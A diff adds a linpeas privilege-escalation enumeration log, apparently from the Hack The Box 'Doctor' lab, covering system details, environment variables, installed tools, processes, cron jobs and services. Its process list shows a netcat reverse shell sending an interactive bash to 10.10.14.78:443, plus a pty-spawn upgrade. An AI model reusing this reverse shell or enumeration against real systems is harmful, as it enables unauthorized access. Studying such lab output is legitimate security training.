@@ -1,0 +1,1996 @@
+root@Kali:~/HTB/Doctor# cat linpeas.txt 
+ Starting linpeas. Building blacklists...
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v2.7.9 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020
+User & Groups: uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+Hostname: doctor
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020
+Distributor ID:	Ubuntu
+Description:	Ubuntu 20.04 LTS
+Release:	20.04
+Codename:	focal
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.31
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/bin:/bin
+New path exported: /usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
+
+[+] Date
+Fr 27. Nov 08:28:05 CET 2020
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+udev            1,9G     0  1,9G   0% /dev
+tmpfs           391M  1,4M  390M   1% /run
+/dev/sda5        20G  7,0G   12G  39% /
+tmpfs           2,0G     0  2,0G   0% /dev/shm
+tmpfs           5,0M     0  5,0M   0% /run/lock
+tmpfs           2,0G     0  2,0G   0% /sys/fs/cgroup
+/dev/loop0       55M   55M     0 100% /snap/core18/1705
+/dev/loop2       63M   63M     0 100% /snap/gtk-common-themes/1506
+/dev/loop1      241M  241M     0 100% /snap/gnome-3-34-1804/24
+/dev/loop3       55M   55M     0 100% /snap/core18/1880
+/dev/loop4      256M  256M     0 100% /snap/gnome-3-34-1804/36
+/dev/loop5       50M   50M     0 100% /snap/snap-store/433
+/dev/loop6       50M   50M     0 100% /snap/snap-store/467
+/dev/loop7       28M   28M     0 100% /snap/snapd/7264
+/dev/loop8       30M   30M     0 100% /snap/snapd/8542
+/dev/sda1       511M  4,0K  511M   1% /boot/efi
+              total        used        free      shared  buff/cache   available
+Mem:        4002248      363900     2825784        3904      812564     3357452
+Swap:        945416           0      945416
+
+[+] CPU info
+Architecture:                    x86_64
+CPU op-mode(s):                  32-bit, 64-bit
+Byte Order:                      Little Endian
+Address sizes:                   43 bits physical, 48 bits virtual
+CPU(s):                          2
+On-line CPU(s) list:             0,1
+Thread(s) per core:              1
+Core(s) per socket:              1
+Socket(s):                       2
+NUMA node(s):                    1
+Vendor ID:                       AuthenticAMD
+CPU family:                      23
+Model:                           49
+Model name:                      AMD EPYC 7302P 16-Core Processor
+Stepping:                        0
+CPU MHz:                         2994.374
+BogoMIPS:                        5988.74
+Hypervisor vendor:               VMware
+Virtualization type:             full
+L1d cache:                       64 KiB
+L1i cache:                       64 KiB
+L2 cache:                        1 MiB
+L3 cache:                        256 MiB
+NUMA node0 CPU(s):               0,1
+Vulnerability Itlb multihit:     Not affected
+Vulnerability L1tf:              Not affected
+Vulnerability Mds:               Not affected
+Vulnerability Meltdown:          Not affected
+Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl and seccomp
+Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization
+Vulnerability Spectre v2:        Mitigation; Full AMD retpoline, IBPB conditional, STIBP disabled, RSB filling
+Vulnerability Srbds:             Not affected
+Vulnerability Tsx async abort:   Not affected
+Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?
+LESSOPEN=| /usr/bin/lesspipe %s
+HISTFILESIZE=0
+LC_TIME=de_DE.UTF-8
+SECRET_KEY=1234
+SHLVL=2
+HOME=/home/web
+PS1=\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] 
+LC_MONETARY=de_DE.UTF-8
+LOGNAME=web
+_=./linpeas.sh
+TERM=xterm
+PATH=/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
+LC_ADDRESS=de_DE.UTF-8
+LANG=en_US.UTF-8
+LC_TELEPHONE=de_DE.UTF-8
+HISTSIZE=0
+SHELL=bash
+LC_NAME=de_DE.UTF-8
+LESSCLOSE=/usr/bin/lesspipe %s %s
+LC_MEASUREMENT=de_DE.UTF-8
+LC_IDENTIFICATION=de_DE.UTF-8
+LC_NUMERIC=de_DE.UTF-8
+SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db
+LC_PAPER=de_DE.UTF-8
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. apparmor module is loaded.
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a container? ........... No
+[+] Any running containers? ........ No
+
+
+=========================================( Devices )==========================================
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+sda5
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+UUID=10a1a694-5210-4862-962d-83204cba73ec /               ext4    errors=remount-ro 0       1
+UUID=85CE-D9D0  /boot/efi       vfat    umask=0077      0       1
+/swapfile                                 none            swap    sw              0       0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/usr/bin/nc
+/usr/bin/netcat
+/usr/bin/nc.traditional
+/usr/bin/wget
+/usr/bin/curl
+/usr/bin/ping
+/usr/bin/gcc
+/usr/bin/g++
+/usr/bin/make
+/usr/bin/gdb
+/usr/bin/base64
+/usr/bin/python2
+/usr/bin/python3
+/usr/bin/python2.7
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Installed Compiler
+ii  g++                                        4:9.3.0-1ubuntu2                    amd64        GNU C++ compiler
+ii  g++-9                                      9.3.0-10ubuntu2                     amd64        GNU C++ compiler
+ii  gcc                                        4:9.3.0-1ubuntu2                    amd64        GNU C compiler
+ii  gcc-9                                      9.3.0-10ubuntu2                     amd64        GNU C compiler
+/usr/bin/gcc
+/usr/bin/g++
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+avahi        914  0.0  0.0   8320   324 ?        S    07:35   0:00 avahi-daemon: chroot helper
+kernoops    1023  0.0  0.0  11240   452 ?        Ss   07:35   0:00 /usr/sbin/kerneloops --test
+kernoops    1025  0.0  0.0  11240   444 ?        Ss   07:35   0:00 /usr/sbin/kerneloops
+lp          1012  0.0  0.1  15316  6668 ?        S    07:35   0:00 /usr/lib/cups/notifier/dbus dbus://
+message+     792  0.0  0.1   8152  5048 ?        Ss   07:35   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root           1  0.0  0.2 167584 11816 ?        Ss   07:35   0:02 /sbin/init splash
+root        1009  0.0  0.2  37056  8884 ?        Ss   07:35   0:00 /usr/sbin/cupsd -l
+root        1011  0.0  0.0  17060  1836 tty1     Ss+  07:35   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root        1139  0.1  2.1 257468 85028 ?        Sl   07:35   0:03 splunkd -p 8089 start
+root         328  0.0  0.3  59840 15732 ?        S<s  07:35   0:00 /lib/systemd/systemd-journald
+root         344  0.0  0.0   2488   516 ?        S    07:35   0:00 bpfilter_umh
+root         368  0.0  0.1  23252  6976 ?        Ss   07:35   0:00 /lib/systemd/systemd-udevd
+root         397  0.0  0.0 150660   280 ?        Ssl  07:35   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
+root         674  0.0  0.2  58756 10472 ?        Ss   07:35   0:00 /usr/bin/VGAuthService
+root         681  0.1  0.2 176228  8408 ?        Ssl  07:35   0:03 /usr/bin/vmtoolsd
+root         770  0.0  0.1 246780  7568 ?        Ssl  07:35   0:00 /usr/lib/accountsservice/accounts-daemon
+root         771  0.0  0.0   2540   724 ?        Ss   07:35   0:00 /usr/sbin/acpid
+root         782  0.0  0.0  18044  3112 ?        Ss   07:35   0:00 /usr/sbin/cron -f
+root         789  0.0  0.0  19756  3452 ?        S    07:35   0:00 /usr/sbin/CRON -f
+root         800  0.0  0.4 270320 19364 ?        Ssl  07:35   0:00 /usr/sbin/NetworkManager --no-daemon[0m
+root         824  0.0  0.0  81944  3660 ?        Ssl  07:35   0:00 /usr/sbin/irqbalance --foreground
+root         826  0.0  0.5  47880 20268 ?        Ss   07:35   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root         830  0.0  0.1 232700  6932 ?        Ssl  07:35   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root         836  0.1  0.7 850076 28788 ?        Ssl  07:35   0:03 /usr/lib/snapd/snapd
+root         840  0.0  0.1  16736  7464 ?        Ss   07:35   0:00 /lib/systemd/systemd-logind
+root         852  0.0  0.2 392404 11860 ?        Ssl  07:35   0:00 /usr/lib/udisks2/udisksd
+root         858  0.0  0.1  13664  5020 ?        Ss   07:35   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+root         967  0.0  0.5 126428 22848 ?        Ssl  07:35   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+root         977  0.0  0.2 313728 10528 ?        Ssl  07:35   0:00 /usr/sbin/ModemManager --filter-policy=strict
+root         978  0.0  0.3 180424 12400 ?        Ssl  07:35   0:00 /usr/sbin/cups-browsed
+root         992  0.0  0.4 193752 18308 ?        Ss   07:35   0:00 /usr/sbin/apache2 -k start
+_rpc         636  0.0  0.0   7088  3932 ?        Ss   07:35   0:00 /sbin/rpcbind -f -w
+syslog       832  0.0  0.1 224504  5428 ?        Ssl  07:35   0:00 /usr/sbin/rsyslogd -n -iNONE
+systemd+     637  0.0  0.3  24044 12288 ?        Ss   07:35   0:01 /lib/systemd/systemd-resolved
+systemd+     639  0.0  0.1  90412  6348 ?        Ssl  07:35   0:00 /lib/systemd/systemd-timesyncd
+web         1904  0.0  0.0   2608   596 ?        S    08:23   0:00 /bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.78 443 >/tmp/f
+web         1907  0.0  0.0  16852   584 ?        S    08:23   0:00 cat /tmp/f
+web         1908  0.0  0.1  19284  5072 ?        S    08:23   0:00 /bin/bash -i
+web         1909  0.0  0.0   3332  2008 ?        S    08:23   0:00 nc 10.10.14.78 443
+web         1919  0.0  0.2  26336  9168 ?        S    08:24   0:00 python3 -c import pty; pty.spawn("/bin/bash")
+web         1920  0.0  0.1  19408  5292 pts/0    Ss   08:24   0:00 /bin/bash
+web         1981  0.2  0.0   3064  2176 pts/0    S+   08:27   0:00 /bin/sh ./linpeas.sh -a
+web         1982  0.0  0.0  16720   588 pts/0    S+   08:27   0:00 tee linpeas.txt
+web         2535  0.0  0.0  20108  3536 pts/0    R+   08:28   0:00 ps aux
+web         2537  0.0  0.0  25264   824 pts/0    S+   08:28   0:00 sort
+web         2541  0.0  0.0   3064   652 pts/0    R+   08:28   0:00 /bin/sh ./linpeas.sh -a
+web         2543  0.0  0.0   3064   652 pts/0    R+   08:28   0:00 /bin/sh ./linpeas.sh -a
+web          915  0.0  0.0   2608   596 ?        Ss   07:35   0:00 /bin/sh -c /home/web/blog.sh
+web          925  0.0  0.0  18124  3416 ?        S    07:35   0:00 /bin/bash /home/web/blog.sh
+web          928  0.1  1.2 160460 49464 ?        Sl   07:35   0:04 /usr/bin/python3 /home/web/blog/run.py
+whoopsie    1022  0.0  0.3 253056 15540 ?        Ssl  07:35   0:00 /usr/bin/whoopsie -f
+www-data    1002  0.0  0.2 194228  9872 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+www-data    1537  0.0  0.2 194228  9876 ?        S    07:49   0:00 /usr/sbin/apache2 -k start
+www-data     996  0.0  0.2 194228  9876 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+www-data     997  0.0  0.2 194228  9876 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+www-data     998  0.0  0.2 194228  9876 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+www-data     999  0.0  0.2 194228  9876 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root  1183448 Jun 18 17:44 /bin/bash
+lrwxrwxrwx 1 root root        4 Jul 20 22:02 /bin/sh -> dash
+-rwxr-xr-x 1 root root   157776 Mai  7  2020 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   264328 Mai  7  2020 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root   403520 Mai  7  2020 /lib/systemd/systemd-resolved
+-rwxr-xr-x 1 root root    55360 Mai  7  2020 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root   735664 Mai  7  2020 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    69000 Apr  2  2020 /sbin/agetty
+lrwxrwxrwx 1 root root       20 Mai  7  2020 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root    59952 Sep 18  2019 /sbin/rpcbind
+-rwxr-xr-x 1 root root  2893136 Mai 20  2020 /sbin/wpa_supplicant
+-rwxr-xr-x 1 root root   249032 Jun 11 20:22 /usr/bin/dbus-daemon[0m
+lrwxrwxrwx 1 root root        9 Jul 20 22:02 /usr/bin/python3 -> python3.8
+-rwxr-xr-x 1 root root   141856 Jun 22 08:40 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root root    64064 Jun 22 08:40 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root    68504 Nov  5  2019 /usr/bin/whoopsie
+-rwxr-xr-x 1 root root   203192 Mai  5  2020 /usr/lib/accountsservice/accounts-daemon
+-rwxr-xr-x 1 root root    18744 Apr 24  2020 /usr/lib/cups/notifier/dbus
+-rwxr-xr-x 1 root root   121504 Aug 16  2019 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root root 26204880 Jul 10 15:59 /usr/lib/snapd/snapd
+-rwxr-xr-x 1 root root   483056 Mär  3  2020 /usr/lib/udisks2/udisksd
+-rwxr-xr-x 1 root root    60432 Nov 28  2019 /usr/sbin/acpid
+-rwxr-xr-x 1 root root   704520 Apr 13  2020 /usr/sbin/apache2
+-rwxr-xr-x 1 root root    55944 Feb 13  2020 /usr/sbin/cron
+-rwxr-xr-x 1 root root   244408 Apr 10  2020 /usr/sbin/cups-browsed
+-rwxr-xr-x 1 root root   465792 Apr 24  2020 /usr/sbin/cupsd
+-rwxr-xr-x 1 root root    64432 Feb 13  2020 /usr/sbin/irqbalance
+-rwxr-xr-x 1 root root    26616 Dez  1  2017 /usr/sbin/kerneloops
+-rwxr-xr-x 1 root root  1588448 Apr 10  2020 /usr/sbin/ModemManager
+-rwxr-xr-x 1 root root  3097016 Mai 20  2020 /usr/sbin/NetworkManager
+-rwxr-xr-x 1 root root   727248 Feb 11  2020 /usr/sbin/rsyslogd
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 process found (dump creds from memory as root)
+sshd: process found (dump creds from memory as root)
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+@reboot /home/web/blog.sh
+-rw-r--r-- 1 root root 1042 Feb 13  2020 /etc/crontab
+
+/etc/cron.d:
+total 36
+drwxr-xr-x   2 root root  4096 Jul 26 10:15 .
+drwxr-xr-x 132 root root 12288 Sep 19 16:54 ..
+-rw-r--r--   1 root root   285 Jul 16  2019 anacron
+-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
+-rw-r--r--   1 root root   712 Mär 27  2020 php
+-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
+-rw-r--r--   1 root root   190 Jul 20 22:06 popularity-contest
+
+/etc/cron.daily:
+total 72
+drwxr-xr-x   2 root root  4096 Jul 26 10:16 .
+drwxr-xr-x 132 root root 12288 Sep 19 16:54 ..
+-rwxr-xr-x   1 root root   311 Jul 16  2019 0anacron
+-rwxr-xr-x   1 root root   539 Apr 13  2020 apache2
+-rwxr-xr-x   1 root root   376 Dez  4  2019 apport
+-rwxr-xr-x   1 root root  1478 Apr  9  2020 apt-compat
+-rwxr-xr-x   1 root root   355 Dez 29  2017 bsdmainutils
+-rwxr-xr-x   1 root root   384 Nov 19  2019 cracklib-runtime
+-rwxr-xr-x   1 root root  1187 Sep  5  2019 dpkg
+-rwxr-xr-x   1 root root   377 Jan 21  2019 logrotate
+-rwxr-xr-x   1 root root  1123 Feb 25  2020 man-db
+-rwxr-xr-x   1 root root   543 Jul 17  2019 mlocate
+-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
+-rwxr-xr-x   1 root root  4574 Jul 18  2019 popularity-contest
+-rwxr-xr-x   1 root root   214 Apr  2  2020 update-notifier-common
+
+/etc/cron.hourly:
+total 20
+drwxr-xr-x   2 root root  4096 Apr 23  2020 .
+drwxr-xr-x 132 root root 12288 Sep 19 16:54 ..
+-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
+
+/etc/cron.monthly:
+total 24
+drwxr-xr-x   2 root root  4096 Apr 23  2020 .
+drwxr-xr-x 132 root root 12288 Sep 19 16:54 ..
+-rwxr-xr-x   1 root root   313 Jul 16  2019 0anacron
+-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
+
+/etc/cron.weekly:
+total 32
+drwxr-xr-x   2 root root  4096 Apr 23  2020 .
+drwxr-xr-x 132 root root 12288 Sep 19 16:54 ..
+-rwxr-xr-x   1 root root   312 Jul 16  2019 0anacron
+-rwxr-xr-x   1 root root   813 Feb 25  2020 man-db
+-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
+-rwxr-xr-x   1 root root   211 Apr  2  2020 update-notifier-common
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+HOME=/root
+LOGNAME=root
+
+1	5	cron.daily	run-parts --report /etc/cron.daily
+7	10	cron.weekly	run-parts --report /etc/cron.weekly
+@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+@reboot /home/web/blog.sh
+
+[+] Services
+[i] Search for outdated versions
+ [ + ]  acpid
+ [ + ]  alsa-utils
+ [ - ]  anacron
+ [ - ]  apache-htcacheclean
+ [ + ]  apache2
+ [ + ]  apparmor
+ [ - ]  apport
+ [ + ]  avahi-daemon
+ [ - ]  bluetooth
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ + ]  cups
+ [ + ]  cups-browsed
+ [ + ]  dbus
+ [ + ]  grub-common
+ [ - ]  hwclock.sh
+ [ + ]  irqbalance
+ [ + ]  kerneloops
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ + ]  network-manager
+ [ + ]  networking
+ [ - ]  nfs-common
+ [ - ]  nfs-kernel-server
+ [ + ]  open-vm-tools
+ [ + ]  openvpn
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ - ]  pppd-dns
+ [ + ]  procps
+ [ - ]  pulseaudio-enable-autospawn
+ [ + ]  rpcbind
+ [ - ]  rsync
+ [ + ]  rsyslog
+ [ - ]  saned
+ [ - ]  speech-dispatcher
+ [ - ]  spice-vdagent
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  ufw
+ [ + ]  unattended-upgrades
+ [ - ]  uuidd
+ [ + ]  whoopsie
+ [ - ]  x11-common
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/lib/systemd/system/initrd-cleanup.service is executing some relative path
+/lib/systemd/system/initrd-parse-etc.service is executing some relative path
+/lib/systemd/system/initrd-switch-root.service is executing some relative path
+/lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path
+/lib/systemd/system/systemd-ask-password-console.service is executing some relative path
+/lib/systemd/system/systemd-ask-password-wall.service is executing some relative path
+/lib/systemd/system/systemd-boot-system-token.service is executing some relative path
+/lib/systemd/system/systemd-halt.service is executing some relative path
+/lib/systemd/system/systemd-hwdb-update.service is executing some relative path
+/lib/systemd/system/systemd-journal-flush.service is executing some relative path
+/lib/systemd/system/systemd-kexec.service is executing some relative path
+/lib/systemd/system/systemd-machine-id-commit.service is executing some relative path
+/lib/systemd/system/systemd-sysusers.service is executing some relative path
+/lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path
+/lib/systemd/system/systemd-udevd.service is executing some relative path
+/lib/systemd/system/systemd-udev-settle.service is executing some relative path
+/lib/systemd/system/systemd-udev-trigger.service is executing some relative path
+/lib/systemd/system/udev.service is executing some relative path
+/lib/systemd/user/gnome-session.service is executing some relative path
+/lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path
+/lib/systemd/user/systemd-tmpfiles-setup.service is executing some relative path
+/usr/lib/systemd/system/initrd-cleanup.service is executing some relative path
+/usr/lib/systemd/system/initrd-parse-etc.service is executing some relative path
+/usr/lib/systemd/system/initrd-switch-root.service is executing some relative path
+/usr/lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path
+/usr/lib/systemd/system/systemd-ask-password-console.service is executing some relative path
+/usr/lib/systemd/system/systemd-ask-password-wall.service is executing some relative path
+/usr/lib/systemd/system/systemd-boot-system-token.service is executing some relative path
+/usr/lib/systemd/system/systemd-halt.service is executing some relative path
